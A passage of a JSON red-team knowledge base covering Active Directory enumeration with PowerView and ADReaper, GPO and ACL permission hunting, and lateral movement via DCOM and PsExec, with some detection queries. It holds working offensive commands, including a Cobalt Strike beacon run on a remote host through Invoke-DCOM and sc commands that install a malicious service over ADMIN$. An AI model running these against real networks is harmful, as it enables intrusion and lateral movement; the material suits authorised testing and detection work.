            "\n## [[PowerView]]\n### Get-ForestDomain\n\n```powershell\nGet-ForestDomain\n\nForest                  : evil.corp\nDomainControllers       : {dc-1.evil.corp}\nChildren                : {edu.evil.corp}\nDomainMode              : Unknown\nDomainModeLevel         : 7\nParent                  : \nPdcRoleOwner            : dc-1.evil.corp\nRidRoleOwner            : dc-1.evil.corp\nInfrastructureRoleOwner : dc-1.evil.corp\nName                    : evil.corp\n\nForest                  : evil.corp\nDomainControllers       : {dc-2.edu.evil.corp}\nChildren                : {}\nDomainMode              : Unknown\nDomainModeLevel         : 7\nParent                  : evil.corp\nPdcRoleOwner            : dc-2.edu.evil.corp\nRidRoleOwner            : dc-2.edu.evil.corp\nInfrastructureRoleOwner : dc-2.edu.evil.corp\nName                    : edu.evil.corp\n```"
        ],
        "tools": [
            "PowerView"
        ],
        "steps": [
            {
                "id": "c1e7b21e-bc94-4f38-ae24-69b8c47b08d2",
                "name": "Retrieve Domain Forest Information",
                "description": "Execute the PowerShell command to enumerate forest domain information, providing details about the forest, domain controllers, and roles.",
                "requirements": {},
                "results": [
                    "FOREST:evil.corp",
                    "DC:dc-1.evil.corp",
                    "DC:dc-2.edu.evil.corp",
                    "ROOT:evil.corp",
                    "CHILD:edu.evil.corp"
                ]
            },
            {
                "id": "b8fcdd11-3cee-4f35-8171-53bfb52ab7d5",
                "name": "List Domain Controllers",
                "description": "Run the `Get-ForestDomain` command to obtain a list of all domain controllers within the current forest and their relevant roles.",
                "requirements": {},
                "results": [
                    "DC:dc-1.evil.corp",
                    "DC:dc-2.edu.evil.corp"
                ]
            },
            {
                "id": "f0f225b7-bf73-4e06-93f4-d1bc1aa99d06",
                "name": "Identify Domain Children",
                "description": "Use the output from the `Get-ForestDomain` to identify any child domains within the forest structure.",
                "requirements": {},
                "results": [
                    "CHILD:edu.evil.corp"
                ]
            },
            {
                "id": "ad6b080c-66c5-455b-aa42-9f992561d1c0",
                "name": "Check Domain Modes",
                "description": "Analyze the domain mode and domain mode level from the forest domain output to determine compatibility and capabilities.",
                "requirements": {},
                "results": [
                    "DOMAIN_MODE:Unknown",
                    "DOMAIN_MODE_LEVEL:7"
                ]
            }
        ]
    },
    {
        "id": "cb4a6e62-b8ab-46fe-b6a4-9ca88e83842a",
        "name": "Domain GPOs",
        "phase": "06. Domain Enumeration",
        "ttp": "T1615",
        "external": false,
        "description": "NoDescription",
        "content": "## Tools\n########\n########",
        "category": "Domain Objects",
        "stealthy": false,
        "changes": [
            "\n## [[ADReaper]]\nTo list GPOs from the domain,\n```\n.\\ADReaper.exe -dc <dc.domain> -user <username> -password <password> -command gpo\n```",
            "\n## [[PowerView]]\n[[Local Administrator Password Solution (LAPS)]]\n\n### Get GPOs filter with name\n\n```powershell\nGet-DomainGPO | ? { $_.DisplayName -like \"*laps*\" } | select DisplayName, Name, GPCFileSysPath | fl\n\ndisplayname    : LAPS\nname           : {4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\ngpcfilesyspath : \\\\edu.evil.corp\\SysVol\\edu.evil.corp\\Policies\\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\n```",
            "\n## [[PowerView]]\n### Resolve ObjectDN\n\nResolve Object Distinguised Name\n\n```powershell\nGet-DomainGPO -Name \"{AD7EE1ED-CDC8-4994-AE0F-50BA8B264829}\" -Properties DisplayName\n\ndisplayname       \n-----------       \nPowerShell Logging\n```\n\n### Create new GPOs\n\nThis PowerView query will show the Security Identifiers (SIDs) of principals that can create new GPOs in the domain, which can be translated via [[PowerView#Convert SID]].\n\n```powershell\nGet-DomainObjectAcl -SearchBase \"CN=Policies,CN=System,DC=edu,DC=evil,DC=corp\" -ResolveGUIDs | ? { $_.ObjectAceType -eq \"Group-Policy-Container\" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl\n\nObjectDN              : CN=Policies,CN=System,DC=edu,DC=evil,DC=corp\nActiveDirectoryRights : CreateChild\nSecurityIdentifier    : S-1-5-21-3263068140-2042698922-2891547269-1125\n```\n\n### Link GPOs\n\n```powershell\nGet-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq \"GP-Link\" -and $_.ActiveDirectoryRights -match \"WriteProperty\" } | select ObjectDN, SecurityIdentifier | fl\n\nObjectDN           : OU=Workstations,DC=edu,DC=evil,DC=corp\nSecurityIdentifier : S-1-5-21-3263068140-2042698922-2891547269-1125\n\nObjectDN           : OU=Servers,DC=edu,DC=evil,DC=corp\nSecurityIdentifier : S-1-5-21-3263068140-2042698922-2891547269-1125\n\nObjectDN           : OU=Tier 1,OU=Servers,DC=edu,DC=evil,DC=corp\nSecurityIdentifier : S-1-5-21-3263068140-2042698922-2891547269-1125\n\nObjectDN           : OU=Tier 2,OU=Servers,DC=edu,DC=evil,DC=corp\nSecurityIdentifier : S-1-5-21-3263068140-2042698922-2891547269-1125\n\n### WriteProperty, WriteDacl, WriteOwner\n\n#### Affecting GPOs\n\nThis query will return any GPO in the domain, where a 4-digit RID has **WriteProperty**, **WriteDacl** or **WriteOwner**. Filtering on a 4-digit RID is a quick way to eliminate the default 512, 519, etc results.\n\n```powershell\nGet-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match \"WriteProperty|WriteDacl|WriteOwner\" -and $_.SecurityIdentifier -match \"S-1-5-21-3263068140-2042698922-2891547269-[\\d]{4,10}\" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl\n\nObjectDN              : CN={AD7EE1ED-CDC8-4994-AE0F-50BA8B264829},CN=Policies,CN=System,DC=edu,DC=evil,DC=corp\nActiveDirectoryRights : CreateChild, DeleteChild, ReadProperty, WriteProperty, GenericExecute\nSecurityIdentifier    : S-1-5-21-3263068140-2042698922-2891547269-1126\n```\n\n[[PowerView#Convert SID]]\n\n#### Affecting user\n\nThis query will return any principal that has **GenericAll**, **WriteProperty** or **WriteDacl** on jonas.\n\n```powershell\nGet-DomainObjectAcl -Identity jonas | ? { $_.ActiveDirectoryRights -match \"GenericAll|WriteProperty|WriteDacl\" -and $_.SecurityIdentifier -match \"S-1-5-21-3263068140-2042698922-2891547269-[\\d]{4,10}\" } | select SecurityIdentifier, ActiveDirectoryRights | fl\n\nSecurityIdentifier    : S-1-5-21-3263068140-2042698922-2891547269-1125\nActiveDirectoryRights : GenericAll\n\nSecurityIdentifier    : S-1-5-21-3263068140-2042698922-2891547269-1125\nActiveDirectoryRights : GenericAll\n\nConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1125\nEDU\\1st Line Support\n```\n\n#### Affecting OU\n\n```powershell\nGet-DomainObjectAcl -SearchBase \"CN=Users,DC=edu,DC=evil,DC=corp\" | ? { $_.ActiveDirectoryRights -match \"GenericAll|WriteProperty|WriteDacl\" -and $_.SecurityIdentifier -match \"S-1-5-21-3263068140-2042698922-2891547269-[\\d]{4,10}\" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl\n\nObjectDN              : CN=Joyce Adam,CN=Users,DC=edu,DC=evil,DC=corp\nActiveDirectoryRights : GenericAll\nSecurityIdentifier    : S-1-5-21-3263068140-2042698922-2891547269-1125\n\nObjectDN              : CN=1st Line Support,CN=Users,DC=edu,DC=evil,DC=corp\nActiveDirectoryRights : GenericAll\nSecurityIdentifier    : S-1-5-21-3263068140-2042698922-2891547269-1125\n\nObjectDN              : CN=Developers,CN=Users,DC=edu,DC=evil,DC=corp\nActiveDirectoryRights : GenericAll\nSecurityIdentifier    : S-1-5-21-3263068140-2042698922-2891547269-1125\n\nObjectDN              : CN=Oracle Admins,CN=Users,DC=edu,DC=evil,DC=corp\nActiveDirectoryRights : GenericAll\nSecurityIdentifier    : S-1-5-21-3263068140-2042698922-2891547269-1125\n```"
        ],
        "tools": [
            "ADReaper",
            "PowerView"
        ],
        "steps": [
            {
                "id": "c72be8d4-9955-4865-b478-8b1f9d253030",
                "name": "List Domain GPOs with ADReaper",
                "description": "Use ADReaper to list all Group Policy Objects (GPOs) in the domain specified by the domain controller address.",
                "requirements": {
                    "tool": "ADReaper",
                    "access": "Domain credentials are required"
                },
                "results": [
                    "GPO:LIST"
                ]
            },
            {
                "id": "d19f73f6-8b0e-4c85-b0f9-15489f22e6b5",
                "name": "Filter GPOs by LAPS",
                "description": "Run PowerView to retrieve GPOs that have names related to Local Administrator Password Solution (LAPS).",
                "requirements": {
                    "tool": "PowerView",
                    "access": "Domain credentials are required"
                },
                "results": [
                    "GPO:LAPS"
                ]
            },
            {
                "id": "55fac45d-9921-45fb-bb4c-5ba9e7b4c899",
                "name": "Resolve GPO Display Name",
                "description": "Use PowerView to resolve the display name of a specific GPO using its GUID.",
                "requirements": {
                    "tool": "PowerView",
                    "access": "Domain credentials are required"
                },
                "results": [
                    "GPO:DISPLAY_NAME"
                ]
            },
            {
                "id": "ba8e1b48-031e-4c83-8f6d-22d4c8ea6c3f",
                "name": "Check GPO Creation Permissions",
                "description": "Query for principals that have permissions to create child GPOs in the domain using PowerView.",
                "requirements": {
                    "tool": "PowerView",
                    "access": "Domain credentials are required"
                },
                "results": [
                    "GPO:CREATE_PERMISSIONS"
                ]
            },
            {
                "id": "966f309b-bd80-4a9d-9bed-96771ff0c371",
                "name": "Link GPOs to OUs",
                "description": "Use PowerView to gather security identifiers for OUs that can link GPOs, checking for write permissions.",
                "requirements": {
                    "tool": "PowerView",
                    "access": "Domain credentials are required"
                },
                "results": [
                    "GPO:LINK_PERMISSIONS"
                ]
            },
            {
                "id": "e8aafcf5-7cfb-44d9-a299-f074fa8e62f8",
                "name": "Find GPOs with Write Permissions",
                "description": "Query for GPOs that have specific write permissions, checking for 4-digit RID SIDs in the domain.",
                "requirements": {
                    "tool": "PowerView",
                    "access": "Domain credentials are required"
                },
                "results": [
                    "GPO:WRITE_PERMISSIONS"
                ]
            },
            {
                "id": "04d4c949-e862-45ea-823e-70e3b12c9bbf",
                "name": "Check User Permissions on GPOs",
                "description": "Retrieve access control lists for a specific user to identify any write or generic permissions on GPOs.",
                "requirements": {
                    "tool": "PowerView",
                    "access": "Domain credentials are required"
                },
                "results": [
                    "GPO:USER_PERMISSIONS"
                ]
            },
            {
                "id": "59dc33a5-a8e5-46b4-bcf9-3290db9d4a81",
                "name": "Check OU Permissions on GPOs",
                "description": "Query access control lists for Organizational Units (OUs) to see if any have generic or write permissions on GPOs.",
                "requirements": {
                    "tool": "PowerView",
                    "access": "Domain credentials are required"
                },
                "results": [
                    "GPO:OU_PERMISSIONS"
                ]
            }
        ]
    },
    {
        "id": "1ef2d0f2-2762-4e8a-8b88-8f1cc4fc4fb6",
        "name": "Domain Groups",
        "phase": "06. Domain Enumeration",
        "ttp": "T1069.002",
        "external": false,
        "description": "NoDescription",
        "category": "Domain Objects",
        "stealthy": false,
        "changes": [
            "\n## [[ADReaper]]\nTo list all available Groups from the domain,\n```\n.\\ADReaper.exe -dc <dc.domain> -user <username> -password <password> -command groups\n```\n\nTo list all Groups with attributes from the domain,\n```\n.\\ADReaper.exe -dc <dc.domain> -user <username> -password <password> -command groups -filter full-data\n```\n\nTo list attributes of Specific Group from the domain,\n```\n.\\ADReaper.exe -dc <dc.domain> -user <username> -password <password> -command groups -name <group name>\n```\n\nTo list members of Specific Group from the domain,\n```\n.\\ADReaper.exe -dc <dc.domain> -user <username> -password <password> -command groups -name <group name> -filter membership\n```\n\nTo list users Never Logged On from the domain,\n```\n.\\ADReaper.exe -dc <dc.domain> -user <username> -password <password> -command never-loggedon\n```",
            "\n## [[PowerView]]\n### Get Groups containing users outside of this domain\n\n```powershell\nGet-DomainForeignGroupMember -Domain evil.external\n\nGroupDomain             : evil.external\nGroupName               : Administrators\nGroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=subsidiary,DC=external\nMemberDomain            : evil.external\nMemberName              : S-1-5-21-3263068140-2042698922-2891547269-1133\nMemberDistinguishedName : CN=S-1-5-21-3263068140-2042698922-2891547269-1133,CN=ForeignSecurityPrincipals,DC=subsidiary,\n                          DC=external\n```\n\nGet the group of the machine\n\n```powershell\nGet-NetLocalGroupMember -ComputerName ad.evil.external\n\nComputerName : ad.evil.external\nGroupName    : Administrators\nMemberName   : EDU\\External Admins\nIsGroup      : True\nIsDomain     : True\n```\n\nGet the users within this group to see who can access this machine\n\n```powershell\nGet-DomainGroupMember -Identity \"External Admins\" | select MemberName\n\nMemberName\n----------\njonas\n```\n\n[[PowerView#Convert SID]]\n\n### Machines that have identity assigned to a target group\n\n```powershell\nGet-DomainGPOUserLocalGroupMapping -Identity \"Jump Users\" -LocalGroup \"Remote Desktop Users\" | select -expand ComputerName\n\nsql1.evil.corp\nexch-1.evil.corp\n```"
        ],
        "tools": [
            "ADReaper",
            "PowerView"
        ],
        "steps": [
            {
                "id": "f1b1d4b8-64b6-4fbe-a6fd-5984b2827b8a",
                "name": "List All Domain Groups",
                "description": "Execute a command to retrieve all available groups from the specified domain controller, capturing basic group information.",
                "requirements": {
                    "tool": "ADReaper",
                    "access": "Domain credentials and appropriate privileges"
                },
                "results": [
                    "GROUP:LIST"
                ]
            },
            {
                "id": "403a6469-70d6-4e15-988e-3521b77a5ca6",
                "name": "List Domain Groups with Attributes",
                "description": "Run a command to list all domain groups while exporting their attributes for detailed analysis.",
                "requirements": {
                    "tool": "ADReaper",
                    "access": "Domain credentials and appropriate privileges"
                },
                "results": [
                    "GROUP:ATTRIBUTES"
                ]
            },
            {
                "id": "966b7f08-530a-4dfc-9307-d1f8031c6937",
                "name": "Attributes of Specific Group",
                "description": "Query the attributes of a specific group using its name to get detailed information about it.",
                "requirements": {
                    "tool": "ADReaper",
                    "access": "Domain credentials and appropriate privileges"
                },
                "results": [
                    "GROUP:INFO"
                ]
            },
            {
                "id": "3cbb0979-1a0d-47f8-b657-a12bc5eacb63",
                "name": "List Group Members",
                "description": "Retrieve a list of members belonging to a specific group by its name, useful for understanding group composition.",
                "requirements": {
                    "tool": "ADReaper",
                    "access": "Domain credentials and appropriate privileges"
                },
                "results": [
                    "GROUP:MEMBERS"
                ]
            },
            {
                "id": "f59c7f14-f460-4e8b-aa3f-9a30f358e6ff",
                "name": "List Users Never Logged On",
                "description": "Identify users from the domain that have never logged on to any system, potentially highlighting unused accounts.",
                "requirements": {
                    "tool": "ADReaper",
                    "access": "Domain credentials and appropriate privileges"
                },
                "results": [
                    "USER:NEVER_LOGGED_ON"
                ]
            },
            {
                "id": "df9a017c-82d2-4e14-80e7-0fcf9a75d890",
                "name": "Get Domain Foreign Group Members",
                "description": "Query to retrieve members of groups that contain users outside the current domain, important for assessing external access risks.",
                "requirements": {
                    "tool": "PowerView",
                    "access": "Domain credentials and appropriate privileges"
                },
                "results": [
                    "FOREIGN_GROUP:MEMBERS"
                ]
            },
            {
                "id": "1d6b3771-6fa8-4913-bf55-2c76e9152cfb",
                "name": "Get Local Group Members",
                "description": "Execute a command to get the members of a local group on the specified computer, providing insights into local administrative access.",
                "requirements": {
                    "tool": "PowerView",
                    "access": "Domain credentials and appropriate privileges on the specified machine"
                },
                "results": [
                    "LOCAL_GROUP:MEMBERS"
                ]
            },
            {
                "id": "c407d4c2-6eb5-4319-8ea0-57bc4c9b67af",
                "name": "List Users in a Group",
                "description": "Retrieve and display the members of a specified domain group, effective for auditing user access rights in specific groups.",
                "requirements": {
                    "tool": "PowerView",
                    "access": "Domain credentials and appropriate privileges"
                },
                "results": [
                    "GROUP:MEMBERS"
                ]
            },
            {
                "id": "3d769c45-f49d-4cd2-bdd9-7b3f88c3bbe3",
                "name": "Get Target Group Machine Mapping",
                "description": "Query to find which machines have identities assigned to a target local group, useful for understanding where groups have influence.",
                "requirements": {
                    "tool": "PowerView",
                    "access": "Domain credentials and appropriate privileges"
                },
                "results": [
                    "MACHINE:GROUP_MAPPING"
                ]
            }
        ]
    },
    {
        "id": "89dd2f45-1771-4acc-b07b-32d799919ad4",
        "name": "Domain Users",
        "phase": "06. Domain Enumeration",
        "ttp": "T1087.002",
        "external": false,
        "description": "NoDescription",
        "content": "# Domain User\n\n## Tools\n########\n########",
        "category": "Domain Objects",
        "stealthy": false,
        "changes": [
            "\n## [[ADReaper]]\nTo list all Users from the domain,\n```\n.\\ADReaper.exe -dc <dc.domain> -user <username> -password <password> -command users\n```\n\nTo list all Users with attributes from the domain,\n```\n.\\ADReaper.exe -dc <dc.domain> -user <username> -password <password> -command users -filter full-data\n```\n\nTo list attributes of Specific Users from the domain,\n```\n.\\ADReaper.exe -dc <dc.domain> -user <username> -password <password> -command users -name <user>\n```\n\nTo list the membership of the Specific User,\n```\n.\\ADReaper.exe -dc <dc.domain> -user <username> -password <password> -command users -name <user> -filter membership\n```",
            "\n## [[PowerView]]\n[[Sensitive Files]]\n\n### Show DomainObject\n\n```powershell\nGet-DomainUser -Identity jonas -Properties ServicePrincipalName\n\nserviceprincipalname\n--------------------\nfake/NOTHING\n```"
        ],
        "tools": [
            "ADReaper",
            "PowerView"
        ],
        "steps": [
            {
                "id": "fe05f55c-e71c-4e51-8f22-3471b1e81b52",
                "name": "List All Domain Users",
                "description": "Execute a command to list all users from the specified domain controller.",
                "requirements": {
                    "tool": "ADReaper",
                    "access": "Valid domain credentials"
                },
                "results": [
                    "USER:LIST"
                ]
            },
            {
                "id": "a610cbb0-0a49-4cde-9b4a-b2b3dbf0782d",
                "name": "List Users with Detailed Attributes",
                "description": "Execute a command to list all users with detailed attributes from the specified domain controller.",
                "requirements": {
                    "tool": "ADReaper",
                    "access": "Valid domain credentials"
                },
                "results": [
                    "USER:FULL_DATA"
                ]
            },
            {
                "id": "1fd8d81b-1b95-41cf-bc73-d2c368b82a15",
                "name": "Get Specific User Attributes",
                "description": "Execute a command to get attributes of a specific user from the domain.",
                "requirements": {
                    "tool": "ADReaper",
                    "access": "Valid domain credentials"
                },
                "results": [
                    "USER:ATTRIBUTES"
                ]
            },
            {
                "id": "ba7fe2c2-6f16-4340-89ea-b1f9e9f6e902",
                "name": "Get Specific User Membership",
                "description": "Execute a command to get group membership of a specific user from the domain.",
                "requirements": {
                    "tool": "ADReaper",
                    "access": "Valid domain credentials"
                },
                "results": [
                    "USER:MEMBERSHIP"
                ]
            },
            {
                "id": "23f53b4d-4869-40f9-b510-f55efb5ed7c8",
                "name": "Show Domain User with Properties",
                "description": "Execute a PowerShell command to retrieve a domain user with specific properties.",
                "requirements": {
                    "tool": "PowerView",
                    "access": "PowerShell environment with required modules loaded"
                },
                "results": [
                    "USER:PROPERTIES"
                ]
            }
        ]
    },
    {
        "id": "7f051fe7-6461-4459-b16f-416b924c125d",
        "name": "Domain",
        "phase": "06. Domain Enumeration",
        "ttp": "T1046",
        "external": false,
        "description": "Enumerating domain objects to gather information about users, groups, computers, and their relationships within a Windows domain.",
        "category": "Domain Objects",
        "stealthy": false,
        "changes": [],
        "tools": [
            "ADReaper",
            "Chameleon",
            "Mimikatz",
            "Net",
            "NMAP",
            "nmcli",
            "Nslookup",
            "PowerView",
            "SharpHound",
            "SharpView",
            "sublist3r",
            "theHarvester",
            "wmic"
        ],
        "steps": [
            {
                "id": "b70fba71-0f89-42ff-b7a5-02a6341e7d79",
                "name": "List Domain Users",
                "description": "Use the 'net user' command to enumerate users in the domain to identify potential accounts for lateral movement.",
                "requirements": {},
                "results": [
                    "USER:DOMAIN\\USERNAME"
                ]
            },
            {
                "id": "e182e3e8-4c29-4d68-b200-0372047c6d57",
                "name": "Enumerate Domain Groups",
                "description": "Use the 'net localgroup' command or PowerView to enumerate groups within the domain to find administrator or high-privilege groups.",
                "requirements": {},
                "results": [
                    "GROUP:DOMAIN\\GroupName"
                ]
            },
            {
                "id": "722cc7dc-91eb-4060-b2fa-3ed16e16b961",
                "name": "Run PowerView to Get AD Users",
                "description": "Execute the PowerView script to retrieve all Active Directory users, displaying their attributes for further investigation.",
                "requirements": {
                    "PowerShell": "version 5.1 or higher"
                },
                "results": [
                    "USER:ADUSERNAME"
                ]
            },
            {
                "id": "195e45ab-82bc-4a2b-b522-deeeb963733e",
                "name": "Use Nslookup for DNS Records",
                "description": "Run 'nslookup' to discover DNS records and services associated with the domain, which could reveal potential entry points.",
                "requirements": {},
                "results": [
                    "DNS:RECORD_TYPE"
                ]
            },
            {
                "id": "3aa32737-79d4-4cbd-bd08-bb4ed3f7848e",
                "name": "Find Shares with net view",
                "description": "Use the 'net view' command to list all shared resources on networked computers that could potentially expose sensitive information.",
                "requirements": {},
                "results": [
                    "SHARE:ComputerName\\ShareName"
                ]
            },
            {
                "id": "65cfba6a-f67b-4bdc-97ea-fd0dcf3c4687",
                "name": "Execute SharpHound for BloodHound Data Collection",
                "description": "Run SharpHound to collect data for BloodHound, mapping out permissions and relationships in the domain.",
                "requirements": {},
                "results": [
                    "OBJECT:DOMAIN_OBJECTS"
                ]
            },
            {
                "id": "4a295609-110e-4e89-b0e1-5e4d9a68cdde",
                "name": "NMAP for Network Discovery",
                "description": "Use NMAP to conduct a network scan of the domain to identify live hosts, open ports, and services running on domain-joined machines.",
                "requirements": {},
                "results": [
                    "HOST:IP_ADDRESS"
                ]
            },
            {
                "id": "30c2ded0-64fc-4cb5-908f-e5cba48d653a",
                "name": "Identify Domain Controllers",
                "description": "Use 'nltest /dcname:<domain>' or 'netdom query dc' to identify domain controllers in a given domain, providing key targets for enumeration.",
                "requirements": {},
                "results": [
                    "DOMAIN_CONTROLLER:DC_NAME"
                ]
            },
            {
                "id": "deb06b43-ff44-4397-977c-42e988927ede",
                "name": "Gather Computer Accounts",
                "description": "Use PowerView cmdlet 'Get-NetComputer' to list all computer accounts in the domain for potential attack vectors.",
                "requirements": {
                    "PowerShell": "version 5.1 or higher"
                },
                "results": [
                    "COMPUTER:COMPUTERNAME"
                ]
            }
        ]
    },
    {
        "id": "16097d41-d915-4e0a-aa53-d49b24f66995",
        "name": "DCOM",
        "phase": "07. Lateral Movement",
        "ttp": "T1021.003",
        "external": false,
        "description": "DCOM is an extension of COM (Component Object Model), which allows applications to instantiate and access the properties and methods of COM objects on a remote computer just like objects on the local machine using the DCERPC-based DCOM protocol. Information about the identity, the implementation and the configuration of every COM (and DCOM) object is stored in the registry, and associated with a few important identifiers:\n- CLSID - The Class Identifier is a GUID, which acts as a unique identifier for a COM class, and every class registered in Windows is associated with a CLSID (COM objects may be used without registration, but that is beyond the scope of this article). The CLSID key in the registry points to the implementation of the class, using the InProcServer32 subkey in case of a dll-based object, and the LocalServer32 key in case of an exe.\n- ProgID - The Programmatic Identifier is an optional identifier, which can be used as a more user-friendly alternative to a CLSID, as it does not have to adhere to the intimidating GUID format of CLSIDs (\"System.AppDomainManager\", for example, is much easier on the eyes than a GUID). ProgIDs are not guaranteed to be unique, and unlike CLSID, not every class is associated with a ProgID.\n- AppID  - The Application Identifier is used to specify the configuration of one or more COM objects associated with the same executable. This includes the permissions given to various groups to instantiate and access the associated classes, both locally and remotely.\n\nThe instantiation of a remote DCOM object behaves as follows:\n1. The client machine requests an instantiation of an object denoted by a CLSID from a remote machine. If the client uses a ProgID, it is first resolved locally to a CLSID.\n2. The remote machine checks if there is an AppID associated with the CLSID in question, and verifies the permissions of the client.\n3. If all goes well, the DCOMLaunch service creates an instance of the requested class, most commonly by running the executable of the LocalServer32 subkey, or by creating a DllHost process to host a dll referenced by the InProcServer32 subkey.\n4. Communication is established between the client application and the server process. In most cases, the new process is created in the session associated with the DCOM communication.\n5. The client can then access the members and methods of the newly created object.",
        "content": "# DCOM\n\n## Cobalt Strike\n-\n\n# Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [
            "\n## [[Invoke-DCOM]]\n'''\nImport-Module .\\Invoke-DCOM.ps1\nInvoke-DCOM -ComputerName '192.168.2.100' -Method MMC20.Application -Command \"calc.exe\"\nInvoke-DCOM -ComputerName '192.168.2.100' -Method ExcelDDE -Command \"calc.exe\"\nInvoke-DCOM -ComputerName '192.168.2.100' -Method ServiceStart \"MyService\"\n'''\n\nTo interact over Distributed Component Object Model (DCOM), we must use an external tool such as [[Invoke-DCOM]].\n''''''beacon\nbeacon> powershell-import C:\\Tools\\Invoke-DCOM.ps1\nbeacon> powershell Invoke-DCOM -ComputerName srv1 -Method MMC20.Application -Command C:\\Windows\\beacon-smb.exe\nCompleted\n\nbeacon> link srv1\n[+] established link to child beacon: 10.10.1.20\n''''''\n\nDCOM is more complicated to detect, since each \"Method\" works in a different way. In the particular case of 'MMC20.Application', the spawned process will be a child of 'mmc.exe'.\n\n''''''\nProcessId: 952\nImage: C:\\Windows\\beacon-smb.exe\nParentImage: C:\\Windows\\System32\\mmc.exe\n''''''  \nProcesses started via DCOM may also be seen where the parent is 'svchost.exe' (started with the command line '-k DcomLaunch')."
        ],
        "tools": [
            "Invoke-DCOM"
        ],
        "references": [
            "https://www.cybereason.com/blog/dcom-lateral-movement-techniques",
            "https://www.winccoa.com/documentation/WinCCOA/3.18/en_US/Treiber_OPC/opc_c_dcom.html"
        ],
        "steps": [
            {
                "id": "5a71f508-42a9-403a-9dbc-250a1a866b00",
                "name": "Get RCE via DCOM",
                "description": "Utilize the Invoke-DCOM module to execute commands on a remote machine using DCOM services. This test will ensure that remote command execution is possible using DCOM methods with specified permissions.",
                "requirements": {
                    "and": [
                        {
                            "tag": "SERVICE:DCOM"
                        },
                        {
                            "tag": "SERVICE:RPC"
                        },
                        {
                            "tag": "PRIVS:ADMIN"
                        }
                    ]
                },
                "results": [
                    "EXECUTION:REMOTE"
                ]
            },
            {
                "id": "f9e0ecf9-a09c-4a60-86ae-54b419657299",
                "name": "Invoke Remote Command via DCOM using MMC20.Application",
                "description": "Execute a command on a remote machine by running the MMC20.Application, which can lead to the execution of the specified command (e.g., calc.exe) on the target system. This tests the ability to interact with the DCOM service successfully.",
                "requirements": {
                    "and": []
                },
                "results": [
                    "EXECUTION:REMOTE",
                    "PROCESS:calc.exe"
                ]
            },
            {
                "id": "e8077942-536e-4b09-8b84-42f0f19c8afa",
                "name": "Invoke Remote Command via DCOM using ExcelDDE",
                "description": "Similar to the previous step, this verifies if a command can be executed on a remote machine via the ExcelDDE method of the DCOM, allowing further testing of DCOM functionalities.",
                "requirements": {
                    "and": []
                },
                "results": [
                    "EXECUTION:REMOTE",
                    "PROCESS:calc.exe"
                ]
            },
            {
                "id": "07e52f19-feae-45e1-b3cf-3e70162e3f68",
                "name": "Start Service via DCOM",
                "description": "Initiate a service on a remote machine using DCOM\u2019s ServiceStart method, which can be tested to determine if service control is possible through DCOM mechanisms.",
                "requirements": {
                    "and": []
                },
                "results": [
                    "SERVICE:START_SUCCESS"
                ]
            }
        ]
    },
    {
        "id": "4c850e26-3460-4906-8e6f-612240140274",
        "name": "PowerShell Remoting",
        "phase": "07. Lateral Movement",
        "ttp": "T1021.006",
        "external": false,
        "description": "PowerShell Remoting is a technique that allows for remote execution of commands on a Windows machine. Detection strategies can focus on identifying associated network connections, process creation, and PowerShell activity.",
        "category": "",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": [
            {
                "id": "0801b49f-70fb-4f49-8c35-f893be282cd6",
                "name": "Monitor Egress Network Connections",
                "description": "Detect egress network connections with destination port 5985, which indicates potential PowerShell Remoting activity.",
                "requirements": {},
                "results": [
                    "NET:EGRESS:PORT5985"
                ]
            },
            {
                "id": "ab9da09d-27be-49f6-b45a-e80027d7329b",
                "name": "Detect wsmprovhost.exe Process Start",
                "description": "Monitor for process start events specifically for wsmprovhost.exe with the '-Embedding' argument, indicating PowerShell Remoting may be in use.",
                "requirements": {},
                "results": [
                    "PROCESS:START:wsmprovhost.exe:EMBEDDING"
                ]
            },
            {
                "id": "5b56d1bc-88d9-4ab8-af82-b80bfceddfc1",
                "name": "Analyze PowerShell Logging",
                "description": "Examine PowerShell logs to retrieve script block logs associated with the process ID obtained from wsmprovhost.exe to track executed commands.",
                "requirements": {},
                "results": [
                    "POWERSHELL:EXECUTION"
                ]
            }
        ]
    },
    {
        "id": "3ccc90c1-567c-4a22-a2f7-127a2ca5873e",
        "name": "PsExec",
        "phase": "07. Lateral Movement",
        "ttp": "T1021.006",
        "external": false,
        "description": "",
        "content": "1. Upload a service binary to the ADMIN$ share via SMB\n2. Create a service on the remote machine with the binpath pointing to the payload\n3. Start the service\n4. When done, clean up by stopping the service and deleting the binary\n\n```cmd\ncopy sv_beacon.exe \\srv1\\ADMIN$\nsc \\srv1 create mal_service binPath='C:\\Windows\\sv_beacon.exe'\ndel \\srv1\\ADMIN$\\sv_beacon.exe\n```\n## Detection\nTo build a detection, the following markers can be used:\n-   File creation.\n-   Service installed.\n-   Process start.\n\nCobalt Strike has a few default behaviours that we can profile:\n-   It uses the same name for the service and the exe.\n-   The name is a random alphanumeric string of length 7.\n-   The service binary is always dropped into `C:\\Windows`.\n\nFurthermore, `psexec` and `psexec64` are the only `jump` methods that will perform a process migration automatically (by default into `rundll32.exe`) in order to delete the binary. It's parent process will be the service binary and would result in a further process create event.\nWith psexec/64, the service filename is always a UNC path (e.g. `\\\\srv1\\ADMIN$\\fe80480.exe`). \n\n`psexec_psh` will execute PowerShell via `%COMSPEC%` (resulting in the command line interpreter, usually `cmd.exe`).\nIf psexec_psh is used, the filepath will be `%COMSPEC% /b /c start /b /min powershell -nop -w hidden -encodedcommand ba`.\n\n>event.module : sysmon and event.type : creation and event.category : file and file.extension : exe and file.directory : 'C:\\\\Windows'\n\nFind the associated service.\n\n>event.provider : 'Service Control Manager' and message : 'A service was installed'\n\n\n## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": [
            {
                "id": "e26b4c1a-8aca-4e64-9ef5-cd7403e52ef7",
                "name": "Upload Service Binary",
                "description": "Upload a binary file to the ADMIN$ share on the target remote machine via SMB using the copy command.",
                "requirements": {},
                "results": [
                    "FILE:UPLOADED"
                ]
            },
            {
